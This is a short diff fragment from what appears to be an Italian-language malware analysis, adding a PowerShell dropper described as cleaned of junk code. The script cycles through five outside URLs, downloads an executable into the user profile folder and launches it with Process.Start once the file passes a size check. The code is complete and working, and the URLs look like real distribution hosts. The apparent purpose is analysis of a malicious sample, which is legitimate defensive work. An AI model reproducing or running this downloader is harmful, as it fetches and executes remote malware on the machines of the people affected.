@@ -31,3 +31,27 @@ foreach($cpNEq505 in $BcMh3qW1){
 }
 ```
 
+Codice PowerShell pulito dal codice inutile:
+```powershell
+$T0RdEKz = '868'
+$zo3ll7 = $env:userprofile + '\' + $T0RdEKz + '.exe'
+
+$qztLCs2T = &('new-object') net.webclient
+
+$BcMh3qW1='http://sasashun.com/MT-4.25-ja/sjqKyopohr/@
+http://theothercentury.com/SEgeVCUgap/@
+https://tecnocrimp.com/administrator/KkGEhGES/@
+http://tittgen.eu/iXOWCOaq/@
+http://tncnet.com/images/yh050r_w6ser-9083/'.SplIt('@');
+
+foreach($cpNEq505 in $BcMh3qW1){
+	try{
+		$qztLCs2T.DownloadFile($cpNEq505, $zo3ll7);
+		if ((Get-Item $zo3ll7).Length -ge 24399) {
+			[Diagnostics.Process]::Start($zo3ll7)
+			break;
+		}
+	}
+	catch{}
+}
+```
